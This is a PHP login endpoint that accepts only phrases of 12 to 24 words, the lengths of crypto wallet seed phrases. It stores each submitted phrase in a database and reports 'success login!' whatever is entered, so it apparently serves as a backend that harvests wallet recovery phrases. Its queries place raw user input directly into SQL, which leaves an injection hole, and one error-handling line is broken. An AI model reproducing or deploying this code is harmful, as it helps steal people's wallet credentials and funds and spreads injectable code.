<?php
	require_once 'config.php';
	// Create connection
	$mysql = new mysqli($servername, $username, $password, $database);

	// Check connection
	if ($mysql->connect_error) {
		$die("Connection failed: " . $mysql->connect_error);
	}
    
    if (!empty($_POST)) {        
        $pharse = $_POST['pharse'];
        $array_str = [12, 15, 18, 21, 24];
    
        if (!in_array(str_word_count($pharse), $array_str)) {
            http_response_code(401);
            $response = [
                'status' => 401,
                'message' => 'Pharse is invalid!'
            ];
            echo json_encode($response);
            die;
        }
        
        $query = mysqli_query($mysql, "SELECT * FROM pharse WHERE pharse = '$pharse'");
        $result = mysqli_fetch_assoc($query);
        if ($result) {
            $response = [
                'status' => 200,
                'message' => 'success login!'
            ];
            echo json_encode($response);
        } else {
            $insert = mysqli_query($mysql, "INSERT INTO pharse(pharse) VALUES('$pharse')");
            if ($insert) {
                $response = [
                    'status' => 200,
                    'message' => 'success login!'
                ];
                echo json_encode($response);
            } else {
                http_response_code(401);
                $response = [
                    'status' => 401,
                    'message' => 'Server error, please try again later!'
                ];
                echo json_encode($response);
            }
        }
    } else {
        $response = [
			'status' => 401,
			'message' => 'Pharse can\'t empty!'
		];
        http_response_code(401);
		echo json_encode($response);
    }
	
?>